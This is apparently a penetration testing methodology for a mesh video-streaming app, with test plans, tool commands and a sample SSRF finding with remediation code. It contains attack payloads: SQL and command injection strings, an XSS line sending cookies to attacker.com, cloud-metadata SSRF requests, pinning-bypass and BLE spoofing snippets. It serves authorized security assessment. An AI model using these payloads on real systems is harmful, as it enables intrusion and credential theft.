# Penetration Testing Methodology
## RENKIVA Mesh TV Network - Full Scope Assessment

**Version:** 1.0  
**Date:** 2025-10-17  
**Engagement Type:** Black-Box, Gray-Box, White-Box (Hybrid)  
**Classification:** Confidential

---

## 1. Executive Summary

This document outlines the comprehensive penetration testing methodology for RENKIVA Mesh TV Network, focusing on mesh-specific attack vectors, mobile security, and peer-to-peer protocol vulnerabilities.

**Testing Phases:**
1. Reconnaissance & Threat Modeling (1 week)
2. Mobile Application Security (Android/iOS) (1 week)
3. Web Application & API Testing (1 week)
4. Mesh Network Protocol Testing (1 week)
5. Cryptographic Validation (1 week)
6. Reporting & Remediation Verification (1 week)

---

## 2. Reconnaissance Phase (Week 1)

### 2.1 Passive Reconnaissance (OSINT)

**Objectives:**
- Map attack surface without touching production systems
- Identify third-party dependencies and external integrations
- Discover publicly exposed information

**Tools:**
- Google dorking, Shodan, Censys
- GitHub code search (leaked secrets, hardcoded credentials)
- DNS enumeration (Sublist3r, Amass)
- Certificate transparency logs (crt.sh)

**Deliverables:**
- Network topology diagram
- Technology stack inventory (SBOM)
- External dependencies map
- Exposed endpoints list

### 2.2 Active Reconnaissance

**In-Scope Targets:**
- Production domain: `https://0ccf7e05-1f49-421f-a13a-a2b6f9fde12f.lovableproject.com`
- Supabase project: `btsriforcmdugnuemlhx.supabase.co`
- Mobile apps: iOS/Android (TestFlight/Internal track)

**Techniques:**
```bash
# Port scanning (rate-limited)
nmap -sV -p- --max-rate 100 target.com

# Subdomain enumeration
amass enum -passive -d lovableproject.com

# Web technology fingerprinting
whatweb target.com
wappalyzer target.com

# SSL/TLS configuration
testssl.sh target.com
```

**Deliverables:**
- Open ports and services inventory
- SSL/TLS configuration report
- Web server fingerprints

### 2.3 Threat Modeling

**STRIDE Analysis:**

| Threat Category | Mesh-Specific Scenarios |
|-----------------|-------------------------|
| **Spoofing** | Fake mesh nodes impersonating trusted peers |
| **Tampering** | MITM attacks on BLE mesh relay hops |
| **Repudiation** | Unsigned content claiming false origin |
| **Information Disclosure** | Location metadata leakage via mesh routing |
| **Denial of Service** | Mesh flood attacks, packet amplification |
| **Elevation of Privilege** | Role escalation via mesh network manipulation |

**Attack Trees:**
- Mesh node impersonation → MITM content injection
- BLE pairing vulnerabilities → Session hijacking
- Proximity spoofing → Geo-fenced content bypass
- Routing table manipulation → Wormhole attacks

**Deliverables:**
- Threat model document (STRIDE)
- Attack tree diagrams
- Risk matrix (Likelihood × Impact)

---

## 3. Mobile Application Security (Week 2)

### 3.1 Android Security Testing

**Static Analysis (APK Teardown):**
```bash
# Decompile APK
apktool d app-release.apk

# Convert DEX to JAR
d2j-dex2jar app-release.apk

# Decompile to Java source
jadx -d output/ app-release.apk

# Search for secrets
grep -r "api_key\|password\|token" app-release/

# Analyze AndroidManifest.xml
grep -E "android:exported=\"true\"|INTERNET|BLUETOOTH" AndroidManifest.xml
```

**Security Checks:**
- [ ] Hardcoded secrets (API keys, tokens)
- [ ] Insecure data storage (SharedPreferences, SQLite)
- [ ] Weak cryptography (MD5, DES, ECB mode)
- [ ] Exported components (activities, services, receivers)
- [ ] Certificate pinning implementation
- [ ] Debuggable builds in production
- [ ] ProGuard/R8 obfuscation disabled

**Dynamic Analysis (Runtime):**
```bash
# Install Frida server
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"

# Hook SSL pinning
frida -U -f com.renkiva.app -l bypass-ssl.js

# Intercept network traffic
mitmproxy --mode transparent --ssl-insecure

# Dump app data
adb shell run-as com.renkiva.app
cd /data/data/com.renkiva.app/
```

**Test Cases:**
1. **Local Storage Security:**
   - Inspect SQLite databases for plaintext PII
   - Check SharedPreferences encryption
   - Verify Keychain/KeyStore usage for secrets

2. **Network Security:**
   - Test certificate pinning bypass
   - MITM attack on API calls
   - Inspect TLS version and cipher suites

3. **Authentication:**
   - Session token storage (secure vs. insecure)
   - Biometric authentication bypass
   - Token expiration and refresh logic

4. **IPC (Inter-Process Communication):**
   - Intent fuzzing (Drozer)
   - Exported content providers
   - Broadcast receiver hijacking

### 3.2 iOS Security Testing

**Static Analysis (IPA Inspection):**
```bash
# Unzip IPA
unzip app.ipa

# Dump binary headers
otool -hv Payload/RenkivaApp.app/RenkivaApp

# Check for PIE (Position Independent Executable)
otool -Iv Payload/RenkivaApp.app/RenkivaApp | grep stack_chk

# Inspect Info.plist
plutil -p Payload/RenkivaApp.app/Info.plist

# Check for jailbreak detection
grep -r "jailbreak\|cydia\|substrate" Payload/
```

**Dynamic Analysis (Jailbroken Device):**
```bash
# SSH into device
ssh root@<device_ip>

# Install Cycript
cycript -p RenkivaApp

# Hook Objective-C methods
frida -U -f com.renkiva.app -l ios-hooks.js

# SSL Kill Switch
# Install via Cydia
```

**Test Cases:**
1. **Keychain Security:**
   - Keychain item accessibility (kSecAttrAccessible)
   - Shared keychain groups
   - Biometric protection (LocalAuthentication)

2. **Transport Security:**
   - App Transport Security (ATS) configuration
   - Certificate pinning (NSURLSession)
   - Custom SSL validation

3. **Jailbreak Detection:**
   - Bypass detection mechanisms
   - Runtime integrity checks

4. **Local Data Storage:**
   - Inspect Documents, Library, Caches directories
   - Core Data encryption
   - Plist file security

### 3.3 Mesh-Specific Mobile Tests

**Bluetooth LE Security:**
```bash
# BLE scanning
hcitool lescan

# GATT service discovery
gatttool -b <MAC_address> --primary

# Sniff BLE packets
ubertooth-btle -f -c capture.pcap
```

**Attack Scenarios:**
1. **BLE Pairing Attacks:**
   - Just Works pairing MITM
   - Passkey brute-force
   - LE Secure Connections downgrade

2. **Mesh Relay Manipulation:**
   - Inject malicious mesh packets
   - Replay attack on fragment reassembly
   - TTL manipulation for packet amplification

3. **Proximity Spoofing:**
   - Fake BLE beacons to simulate nearness
   - Test geo-fencing bypass

**Tools:**
- Ubertooth One (BLE sniffer)
- Nordic nRF52840 DK (protocol analysis)
- GATTacker (GATT fuzzing)
- Wireshark with BLE plugin

---

## 4. Web Application & API Testing (Week 3)

### 4.1 OWASP Top 10 Testing

**1. Broken Access Control:**
```http
# Test horizontal privilege escalation
GET /api/users/other-user-id HTTP/1.1
Authorization: Bearer <my_token>

# Test vertical privilege escalation
POST /api/admin/users HTTP/1.1
Authorization: Bearer <regular_user_token>

# IDOR (Insecure Direct Object Reference)
GET /api/shows/00000000-0000-0000-0000-000000000001
```

**2. Cryptographic Failures:**
- Test for unencrypted data transmission (HTTP vs HTTPS)
- Check for weak SSL/TLS configurations
- Inspect session tokens for randomness (entropy analysis)
- Test password storage (bcrypt vs plaintext)

**3. Injection Attacks:**
```sql
-- SQL Injection (Supabase RLS bypass attempts)
'; DROP TABLE shows; --
' OR '1'='1
UNION SELECT * FROM pg_shadow --

-- NoSQL Injection (JSON payloads)
{"$gt": ""}
{"$ne": null}

-- Command Injection (if server-side processing)
; ls -la /etc/passwd
| whoami
```

**4. XSS (Cross-Site Scripting):**
```javascript
// Reflected XSS
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>

// Stored XSS (in video titles, descriptions)
<svg/onload=fetch('https://attacker.com?c='+document.cookie)>

// DOM-based XSS
window.location.hash = '<img src=x onerror=alert(1)>'
```

**5. Broken Authentication:**
- Brute-force login (rate limiting test)
- Session fixation
- JWT token manipulation (signature bypass, algorithm confusion)
- Password reset token predictability

**6. Security Misconfiguration:**
- Verbose error messages (stack traces)
- Default credentials
- Unnecessary HTTP methods (PUT, DELETE, TRACE)
- Missing security headers (CSP, X-Frame-Options, HSTS)

### 4.2 API Security Testing

**Edge Function Enumeration:**
```bash
# List all edge functions
curl https://btsriforcmdugnuemlhx.supabase.co/functions/v1/

# Test unauthenticated access
curl -X POST https://.../functions/v1/mass-import \
  -H "Content-Type: application/json" \
  -d '{"limit": 100}'

# JWT bypass attempts
curl -X POST https://.../functions/v1/upload-content \
  -H "Authorization: Bearer invalid_token"
```

**GraphQL/REST API Tests:**
- Introspection queries (schema enumeration)
- Batch query attacks (resource exhaustion)
- Rate limiting bypass (X-Forwarded-For spoofing)
- Parameter pollution

**SSRF (Server-Side Request Forgery):**
```bash
# Test webhook function
curl -X POST https://.../functions/v1/content-webhook \
  -d '{"external_webhook_url": "http://127.0.0.1:5432"}'

# Cloud metadata attacks
curl -X POST ... \
  -d '{"external_webhook_url": "http://169.254.169.254/latest/meta-data/"}'
```

### 4.3 Business Logic Testing

**Scenario 1: Content Distribution Abuse**
- Upload same video multiple times to exhaust storage
- Manipulate fragment reassembly to corrupt streams
- Bypass access tokens for private content

**Scenario 2: Mesh Network Gaming**
- Fake viewer statistics via spoofed device fingerprints
- Manipulate TTL to amplify mesh packet reach
- Exploit rekey timing to intercept content

**Scenario 3: Sponsorship Fraud**
- Spoof ad impressions via automated requests
- Bypass geographic targeting with VPN
- Manipulate view duration metrics

---

## 5. Mesh Network Protocol Testing (Week 4)

### 5.1 MNMP (MeshTV Noise Mesh Protocol) Analysis

**Protocol Specification Review:**
- Packet structure validation (version, type, TTL, flags)
- Signature verification (Ed25519)
- Fragment reassembly logic
- Encryption nonce handling (ChaCha20-Poly1305)

**Test Vectors:**
```javascript
// Test Case 1: Replay Attack
const capturedPacket = { /* sniffed packet */ };
// Replay same packet 100 times
for (let i = 0; i < 100; i++) {
  sendToMesh(capturedPacket);
}
// Expected: All replays rejected after first

// Test Case 2: TTL Manipulation
const amplifiedPacket = {
  ...normalPacket,
  ttl: 255  // Max hops for amplification
};
sendToMesh(amplifiedPacket);
// Expected: Packet rejected or TTL capped at 6

// Test Case 3: Malformed Fragments
const badFragment = {
  streamId: validId,
  fragmentIndex: 999999,  // Out of bounds
  totalFragments: 10
};
sendToMesh(badFragment);
// Expected: Graceful error, no crash
```

### 5.2 Noise Protocol Handshake Testing

**Handshake Conformance Tests:**
```python
# Test vector validation (RFC 7748, Noise spec)
def test_noise_xx_handshake():
    # Known test vectors
    initiator_static = bytes.fromhex("...")
    responder_static = bytes.fromhex("...")
    
    # Perform handshake
    transcript = noise_handshake(initiator_static, responder_static)
    
    # Verify against known output
    assert transcript == expected_transcript
```

**Attack Scenarios:**
1. **Handshake Downgrade:**
   - Force fallback to weaker Noise pattern
   - Test for protocol version rollback

2. **Identity Key Confusion:**
   - Swap initiator/responder keys
   - Test for key confirmation bypass

3. **Replay Handshake Messages:**
   - Capture and replay Message 1, 2, 3
   - Test for nonce reuse detection

### 5.3 BLE Mesh Security Testing

**Advertising Attacks:**
```python
# Malicious BLE advertising
from bluepy.btle import Scanner, DefaultDelegate

class MaliciousAdvertiser:
    def advertise_fake_node(self):
        # Spoof legitimate node's MAC address
        advertise_data = {
            'flags': 0x06,
            'service_uuid': 'RENKIVA_MESH_SERVICE',
            'device_name': 'TrustedNode-Spoofed'
        }
        broadcast(advertise_data)
```

**Provisioning Attacks:**
- Test for insecure provisioning (no OOB verification)
- Capture provisioning data (network keys)
- MITM during QR code scanning

**Relay Attacks:**
```bash
# Proxy BLE traffic between nodes
bettercap -iface wlan0
> ble.recon on
> ble.enum <target_mac>
> ble.proxy on
```

---

## 6. Cryptographic Validation (Week 5)

### 6.1 Algorithm Compliance Testing

**Approved Algorithms Check:**
| Algorithm | Required | Actual | Status |
|-----------|----------|--------|--------|
| Key Exchange | X25519 | ? | ⏳ Verify |
| Signing | Ed25519 | ? | ⏳ Verify |
| AEAD | ChaCha20-Poly1305 | ? | ⏳ Verify |
| Hashing | BLAKE2s/SHA-256 | ? | ⏳ Verify |
| Protocol | Noise XX | ? | ⏳ Verify |

**Test Script:**
```typescript
import { CryptoPrimitives } from './src/security/crypto/primitives';

async function validateCrypto() {
  const crypto = CryptoPrimitives.getInstance();
  
  // Test 1: Key generation
  const keyPair = await crypto.generateX25519KeyPair();
  assert(keyPair.publicKey.length === 32, "X25519 public key must be 32 bytes");
  
  // Test 2: AEAD encryption
  const plaintext = new Uint8Array([1, 2, 3]);
  const key = crypto.randomBytes(32);
  const nonce = crypto.randomBytes(12);
  const ciphertext = await crypto.chacha20Poly1305Encrypt(key, nonce, plaintext);
  assert(ciphertext.length === plaintext.length + 16, "Poly1305 tag must be 16 bytes");
  
  // Test 3: Signature verification
  const message = new TextEncoder().encode("test");
  const sigKeyPair = await crypto.generateEd25519KeyPair();
  const signature = await crypto.ed25519Sign(sigKeyPair.privateKey, message);
  const valid = await crypto.ed25519Verify(sigKeyPair.publicKey, signature, message);
  assert(valid === true, "Signature must verify");
}
```

### 6.2 Key Management Audit

**Key Lifecycle Checks:**
1. **Generation:**
   - CSPRNG quality (entropy source)
   - Key length validation
   - Hardware-backed generation (StrongBox/Secure Enclave)

2. **Storage:**
   - Encryption at rest
   - Access control (biometric unlock)
   - Backup procedures (secure vs. insecure)

3. **Rotation:**
   - Automatic rekey interval (10 minutes)
   - Data threshold trigger (32 MiB)
   - Session continuity during rekey

4. **Destruction:**
   - Secure deletion (zeroization)
   - Memory cleanup on app exit

**Test Code:**
```typescript
// Test automatic key rotation
async function testKeyRotation() {
  const session = new EncryptionLayer();
  await session.initiateHandshake('peer-id');
  
  // Send 35 MiB of data (exceeds 32 MiB threshold)
  for (let i = 0; i < 35; i++) {
    const payload = new Uint8Array(1024 * 1024); // 1 MiB
    await session.encryptPayload('peer-id', payload);
  }
  
  // Verify new keys were derived
  const oldKey = session.getEncryptionKey('peer-id');
  await new Promise(resolve => setTimeout(resolve, 1000));
  const newKey = session.getEncryptionKey('peer-id');
  
  assert(!constantTimeEqual(oldKey, newKey), "Keys must rotate after threshold");
}
```

### 6.3 Side-Channel Analysis

**Timing Attack Tests:**
```python
import time
import statistics

def timing_attack_test(verify_function, correct_signature, wrong_signature):
    """Test for constant-time signature verification"""
    
    correct_times = []
    wrong_times = []
    
    for _ in range(1000):
        start = time.perf_counter()
        verify_function(correct_signature)
        correct_times.append(time.perf_counter() - start)
        
        start = time.perf_counter()
        verify_function(wrong_signature)
        wrong_times.append(time.perf_counter() - start)
    
    # Statistical analysis
    correct_mean = statistics.mean(correct_times)
    wrong_mean = statistics.mean(wrong_times)
    
    # Timing difference should be negligible (<5% variance)
    difference = abs(correct_mean - wrong_mean)
    threshold = correct_mean * 0.05
    
    assert difference < threshold, f"Timing leak detected: {difference}s"
```

**Memory Analysis:**
- Heap inspection for key material
- Stack overflow tests with crypto operations
- Memory dumps after app termination

---

## 7. Reporting & Remediation (Week 6)

### 7.1 Finding Classification

**CVSS v4.0 Scoring:**
```
Base Metrics:
- Attack Vector (AV): Network/Adjacent/Local/Physical
- Attack Complexity (AC): Low/High
- Attack Requirements (AT): None/Present
- Privileges Required (PR): None/Low/High
- User Interaction (UI): None/Passive/Active
- Confidentiality (VC): High/Low/None
- Integrity (VI): High/Low/None
- Availability (VA): High/Low/None
```

**Example Finding:**
```markdown
### Finding: Webhook SSRF Vulnerability

**Severity:** Critical (CVSS 9.1)
**CVSS Vector:** CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:L

**Description:**
The content-webhook edge function makes POST requests to user-supplied URLs without validation, enabling SSRF attacks against internal infrastructure.

**Proof of Concept:**
1. Create webhook with URL: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
2. Trigger webhook via content upload
3. Observe AWS credentials leaked in response

**Impact:**
- Cloud metadata exfiltration (IAM keys, instance credentials)
- Internal network reconnaissance (port scanning via timing)
- Database access via localhost:5432

**Remediation:**
Implement URL validation before making requests:
\`\`\`typescript
function validateWebhookUrl(url: string): boolean {
  const parsed = new URL(url);
  
  // Only HTTPS allowed
  if (parsed.protocol !== 'https:') return false;
  
  // Block private IP ranges
  const hostname = parsed.hostname;
  if (isPrivateIP(hostname)) return false;
  
  // Block metadata endpoints
  if (hostname === '169.254.169.254') return false;
  
  return true;
}
\`\`\`

**References:**
- OWASP SSRF: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- CWE-918: https://cwe.mitre.org/data/definitions/918.html
```

### 7.2 Remediation Verification

**Retest Procedure:**
1. **Confirm Fix Deployed:**
   - Check git commit hash
   - Verify deployment timestamp
   - Test on staging before production

2. **Execute Original PoC:**
   - Run exact same attack steps
   - Expected: Attack now blocked

3. **Bypass Attempts:**
   - Try alternative attack vectors
   - Test edge cases (IPv6, URL encoding, DNS rebinding)

4. **Regression Testing:**
   - Ensure fix doesn't break legitimate functionality
   - Performance impact assessment

**Sign-Off Criteria:**
- [ ] Original PoC no longer works
- [ ] No bypass techniques successful
- [ ] Legitimate use cases still functional
- [ ] Code review completed
- [ ] Unit tests added for vulnerability

---

## 8. Specialized Test Cases

### 8.1 Privacy Testing (Location Tracking)

**Data Collection Validation:**
```javascript
// Monitor network traffic for location data
mitmproxy --script ./location_sniffer.py

# location_sniffer.py
def response(flow):
    if 'view_stats' in flow.request.url:
        data = json.loads(flow.request.content)
        if 'location_lat' in data:
            lat = data['location_lat']
            lng = data['location_lng']
            
            # Check precision
            lat_decimals = len(str(lat).split('.')[1])
            assert lat_decimals <= 2, f"Location too precise: {lat_decimals} decimals"
```

**GDPR Compliance Tests:**
- [ ] Consent flow shown before location collection
- [ ] User can opt-out and still use app
- [ ] Data export includes all location history
- [ ] Data deletion removes location records
- [ ] Privacy policy accurately describes collection

### 8.2 Mesh Flood Resistance

**Denial of Service Testing:**
```python
import asyncio

async def mesh_flood_test():
    """Test mesh network resilience to flood attacks"""
    
    # Simulate 1000 mesh nodes sending packets simultaneously
    tasks = []
    for i in range(1000):
        packet = create_mesh_packet(f"node-{i}")
        tasks.append(send_to_mesh(packet))
    
    start_time = time.time()
    await asyncio.gather(*tasks)
    end_time = time.time()
    
    # Measure performance degradation
    latency = end_time - start_time
    assert latency < 5.0, f"Flood caused {latency}s delay (>5s threshold)"
    
    # Check CPU and memory usage
    cpu_percent = psutil.cpu_percent()
    assert cpu_percent < 50, f"CPU usage {cpu_percent}% exceeds 50%"
```

### 8.3 Mesh Routing Attacks

**Wormhole Attack:**
```
Normal Route: NodeA → NodeB → NodeC → NodeD (4 hops)
Wormhole:     NodeA → [Attacker Tunnel] → NodeD (1 hop)
                      ↑ Attacker relays packets via internet, appearing as 1-hop neighbor

Test: Detect abnormally low latency for geographically distant nodes
```

**Sybil Attack:**
```python
def sybil_attack_simulation():
    """Create 100 fake mesh node identities"""
    for i in range(100):
        fake_node = {
            'id': generate_node_id(),
            'public_key': generate_fake_key(),
            'signal_strength': -50  # Strong signal
        }
        register_mesh_node(fake_node)
    
    # Verify network rejects or rate-limits new nodes
```

---

## 9. Tools & Environment

### 9.1 Required Software

**Penetration Testing Distribution:**
- Kali Linux 2024.1+ or Parrot OS
- Mobile testing: Genymotion, Android Studio, Xcode

**Core Tools:**
```bash
# Install pentesting suite
apt-get install -y \
  nmap masscan nuclei ffuf \
  burpsuite zaproxy sqlmap \
  metasploit-framework \
  frida-tools objection \
  wireshark ubertooth \
  testssl.sh nikto dirb \
  john hashcat hydra
```

**Mobile-Specific:**
```bash
# Android tools
apt-get install -y apktool jadx dex2jar androguard

# iOS tools (macOS)
brew install class-dump hopper-disassembler
```

**Mesh Network Tools:**
```bash
# BLE tools
apt-get install -y bluez hcitool gatttool
pip install bluepy gattacker

# Protocol analysis
wireshark (with BLE plugin)
```

### 9.2 Test Environment Setup

**Network Isolation:**
- Separate VPN for pentest traffic
- Staging environment mirror of production
- Test user accounts (pentest-user-01 through -10)

**Mobile Devices:**
- 2x Android devices (1 rooted, 1 stock)
- 2x iOS devices (1 jailbroken, 1 stock)
- BLE sniffer hardware (Ubertooth One)

**Reporting Platform:**
- Dradis or Faraday for collaboration
- PlantUML for attack diagrams
- CVSS calculator v4.0

---

## 10. Acceptance Criteria

**Engagement Complete When:**
- ✅ All in-scope assets tested per methodology
- ✅ 100+ test cases executed and documented
- ✅ All findings validated with PoCs
- ✅ CVSS scores assigned (v4.0)
- ✅ Remediation guidance provided with code samples
- ✅ Executive summary and technical report delivered
- ✅ Retest completed for all critical/high findings
- ✅ Final report approved by client security team

**Quality Metrics:**
- Zero false positives in critical/high findings
- 90%+ coverage of OWASP Top 10
- Mesh-specific test cases cover 80%+ of protocol edge cases
- All cryptographic implementations validated against test vectors

---

**Document Owner:** Security Assessment Team  
**Last Updated:** 2025-10-17  
**Classification:** Confidential
